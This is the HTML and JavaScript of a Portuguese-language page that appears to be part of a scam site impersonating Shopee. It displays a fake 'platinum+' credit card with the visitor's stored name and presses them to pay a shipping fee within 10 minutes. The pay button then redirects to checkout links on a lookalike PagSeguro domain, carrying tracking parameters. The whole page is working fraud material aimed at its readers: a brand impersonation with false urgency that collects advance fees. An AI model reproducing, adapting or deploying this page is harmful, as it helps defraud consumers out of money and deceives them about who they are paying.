<body>
    <div class="header">
        <img src="../../../../../../../../pabluzw.com/shopee-cartao/logo.png" alt="Shopee Logo" style="width: 160px;">
    </div>

    <div class="main-content">
        <div class="card-credit">
            <div class="card-details">
                <div class="bank-name">shopee</div>
                <div class="platinum">platinum+</div>
                <div class="chip mt-3">
                    <img src="../../../../../../../128/9334/9334627-1.png" alt="Chip do cartão" class="chip-img">
                    <img src="../../../../../../../show/369926/connection-nfc-1.svg" alt="NFC" class="nfc-img">
                </div>
                <div class="name-info" id="nomeCartao"></div> 
                <div class="mastercard">
                    <img src="../../../../../../../8b1cc0c7-5e15-4589-8ee6-efa6016a75ce/8b1cc0c7-5e15-4589-8ee6-efa6016a75ce-1.png" alt="Mastercard Logo">
                </div>
            </div>
        </div>

        <div class="info-section">
            <p>O Cartão Virtual será enviado com as seguintes condições:</p>
            <p><strong>Necessário concluir o pagamento do envio em até 10 minutos.</strong></p>
            <p>Após a aprovação, o sistema enviará automaticamente para o WhatsApp cadastrado.</p>
        </div>

        <button type="button" id="botaoPagar" class="btn-custom">
            Pagar Agora
        </button>
    </div>

<script>
    document.addEventListener("DOMContentLoaded", function() {
        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
        if (dadosUsuario && dadosUsuario.nome) {
            const nomeCompleto = dadosUsuario.nome.split(' ');
            const primeiroNome = nomeCompleto[0];
            const ultimoNome = nomeCompleto[nomeCompleto.length - 1];
            const nomeParaMostrar = `${primeiroNome} ${ultimoNome}`;
            document.getElementById('nomeCartao').textContent = nomeParaMostrar;
        }
    });

    document.getElementById('botaoPagar').addEventListener('click', function() {
        const freteEscolhido = localStorage.getItem('freteEscolhido');

        function appendUTMParamsToUrl(url) {
            const utmParams = JSON.parse(localStorage.getItem('utmParams'));
            if (utmParams) {
                const params = new URLSearchParams(utmParams);
                return url + '?' + params.toString();
            }
            return url;
        }

        if (freteEscolhido) {
            let checkoutUrl = freteEscolhido === 'sedex' 
                ? 'https://pay.comprapagseguro.online/kYL6ge6vBvp3rKM'
                : 'https://pay.comprapagseguro.online/eApQgzm040VGEb7';
            
            window.location.href = appendUTMParamsToUrl(checkoutUrl);
        } else {
            alert('Erro: Nenhuma modalidade de envio selecionada.');
        }
    });
</script>
